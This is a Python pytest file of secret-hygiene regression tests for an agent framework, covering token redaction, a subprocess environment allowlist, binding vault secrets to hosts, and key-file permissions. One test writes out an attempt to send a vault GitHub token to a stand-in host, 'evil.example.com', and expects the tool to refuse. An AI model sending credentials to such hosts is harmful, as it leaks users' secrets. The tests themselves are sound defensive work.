"""Phase-2 secret-hygiene regression tests.

- value-based redactor masks embedded tokens (not just secret-named keys)
- codex_cli passes only an allowlisted env to the subprocess
- http_request host binding refuses to send a vault secret to the wrong host
- vault key file with loose permissions is tightened on read
"""

import os
import stat

import pytest

from src.core.audit import _redact, redact_secrets, scrub_value


class _Vault:
    def __init__(self, data):
        self._d = data

    def get(self, key):
        return self._d.get(key)


# --- redactor ---

def test_scrub_embedded_tokens():
    cmd = 'curl -H "Authorization: Bearer ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" u'
    out = scrub_value(cmd)
    assert "ghp_" not in out and "[REDACTED]" in out


@pytest.mark.parametrize("secret", [
    "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWX",
    "xoxb-123456789012-abcdefghijkl",
    "AKIAIOSFODNN7EXAMPLE",
    "ya29.a0AfB_byExampleTokenValue12345",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4",
])
def test_known_token_shapes_scrubbed(secret):
    assert scrub_value(f"prefix {secret} suffix") == "prefix [REDACTED] suffix"


def test_redact_secrets_key_and_value_and_nesting():
    d = {"token": "keep-secret", "command": "gh auth login --with-token ghp_" + "A" * 36,
         "nested": {"note": "ok", "url": "https://x?k=sk-" + "a" * 24}}
    r = redact_secrets(d)
    assert r["token"] == "[REDACTED]"
    assert "ghp_" not in r["command"]
    assert "sk-aaaa" not in str(r["nested"])
    assert r["nested"]["note"] == "ok"


def test_redact_wrapper_returns_dict():
    assert _redact({"a": 1}) == {"a": 1}
    assert _redact("notadict") == "notadict"


def test_plain_text_not_over_redacted():
    s = "the meeting is at 15:30 with 42 people in room 7"
    assert scrub_value(s) == s


# --- codex env allowlist ---

def test_codex_env_allowlist_excludes_secrets(monkeypatch):
    from src.llm.codex_cli import CodexCLIProvider
    monkeypatch.setenv("GH_TOKEN", "ghp_secret")
    monkeypatch.setenv("DISCORD_TOKEN", "discord_secret")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret")
    monkeypatch.setenv("PATH", "/usr/bin")
    allow = CodexCLIProvider._ENV_ALLOWLIST
    filtered = {k: v for k, v in os.environ.items() if k in allow}
    assert "GH_TOKEN" not in filtered
    assert "DISCORD_TOKEN" not in filtered
    assert "ANTHROPIC_API_KEY" not in filtered
    assert filtered.get("PATH") == "/usr/bin"


# --- http_request host binding ---

def _stub_public_dns(monkeypatch):
    # Make any hostname "resolve" to a public IP so the SSRF check passes
    # deterministically (no network) and the host-binding logic is exercised.
    monkeypatch.setattr(
        "src.lib.ssrf.socket.getaddrinfo",
        lambda host, *a, **k: [(2, 1, 6, "", ("93.184.216.34", 0))],
    )


async def test_http_secret_bound_to_host_refuses_other(monkeypatch):
    from src.core.base import ToolContext
    from src.tools.http_request import http_request
    _stub_public_dns(monkeypatch)
    ctx = ToolContext(agent_id="a", vault=_Vault({
        "secrets/gh": "ghp_token", "secrets/gh.hosts": "api.github.com"}))
    out = await http_request(ctx, "GET", "https://evil.example.com/", auth_secret="gh", timeout=1)
    assert "Refusing to send secret" in out and "evil.example.com" in out


async def test_http_secret_bound_to_host_allows_match(monkeypatch):
    # Host matches the binding → passes the binding check (the connection then
    # fails, which is fine — we only assert it got past the refusal guard).
    from src.core.base import ToolContext
    from src.tools.http_request import http_request
    _stub_public_dns(monkeypatch)
    ctx = ToolContext(agent_id="a", vault=_Vault({
        "secrets/gh": "ghp_token", "secrets/gh.hosts": "api.github.com"}))
    out = await http_request(ctx, "GET", "https://api.github.com/", auth_secret="gh", timeout=1)
    assert "Refusing to send secret" not in out


# --- vault key-file mode ---

def test_key_file_permissions_tightened(tmp_path):
    from src.core.base import read_vault_key_file
    kf = tmp_path / "vault-key"
    kf.write_text("passphrase\n")
    kf.chmod(0o644)  # group/world readable
    val = read_vault_key_file(kf)
    assert val == "passphrase"
    mode = stat.S_IMODE(kf.stat().st_mode)
    assert mode == 0o600
